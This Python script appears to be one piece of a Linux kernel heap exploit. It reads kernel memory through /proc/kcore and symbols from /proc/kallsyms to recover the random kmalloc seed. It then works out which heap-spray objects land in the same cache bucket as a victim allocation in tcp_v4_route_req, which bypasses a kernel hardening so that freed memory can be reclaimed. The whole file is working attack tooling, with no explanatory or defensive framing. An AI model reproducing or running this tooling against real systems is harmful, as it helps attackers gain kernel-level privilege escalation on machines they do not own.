#!/usr/bin/env python3
"""any_match.py - victim bucket matches ANY of the implemented sprays.

Prints the matching spray names.  The combined fire sprays all of them on
the victim CPU, so no per-type boot hunt is needed; the coverage is
(#sprays)/16 per boot and grows toward 16/16 (no reboot) as sprays are added.
"""
import struct


def rd(va, n):
    f = open('/proc/kcore', 'rb')
    h = f.read(64)
    off = struct.unpack_from('<Q', h, 0x20)[0]
    es = struct.unpack_from('<H', h, 0x36)[0]
    en = struct.unpack_from('<H', h, 0x38)[0]
    f.seek(off)
    for _ in range(en):
        ph = f.read(es)
        t = struct.unpack_from('<I', ph, 0)[0]
        po, pv, pp, pf = struct.unpack_from('<QQQQ', ph, 8)
        if t == 1 and pv <= va < pv + pf:
            f.seek(po + va - pv)
            return f.read(n)
    return None


s = {}
for line in open('/proc/kallsyms'):
    p = line.split()
    if len(p) >= 3:
        try:
            s[p[2]] = int(p[0], 16)
        except ValueError:
            pass
seed = struct.unpack('<Q', rd(s['random_kmalloc_seed'], 8))[0]
GOLD = 0x61C8864680B583EB
M = (1 << 64) - 1


def idx(c):
    return (((c ^ seed) & M) * GOLD & M) >> 60


v = idx(s['tcp_v4_route_req'] + 0x91)
cands = {
    'saved': idx(s['tcp_reqsk_record_syn'] + 0x77),
    'key': idx(s['user_preparse'] + 0x36),
    'unix': idx(s['unix_create_addr'] + 0x29),
    'sfkmalloc': idx(s['sock_kmalloc'] + 0x42),
}
# Only persistent, user-controlled objects count as usable reclaim buckets.
# sfkmalloc is informational: the AF_ALG key buffer is freed and zeroed
# immediately by alg_setsockopt (sock_kzfree_s), so it cannot reclaim.
import os
usable = tuple(os.environ.get('USABLE_BUCKETS', 'saved,key,unix').split(','))
hit = [n for n in usable if cands[n] == v]
info = [n for n, x in cands.items() if x == v and n not in usable]
if hit:
    verdict = "ANY:" + ",".join(hit)
elif info:
    verdict = "nomatch(ignored:" + ",".join(info) + ")"
else:
    verdict = "nomatch"
print("seed=%#x victim=%d saved=%d key=%d unix=%d sfkmalloc=%d %s" %
      (seed, v, cands['saved'], cands['key'], cands['unix'],
       cands['sfkmalloc'], verdict))
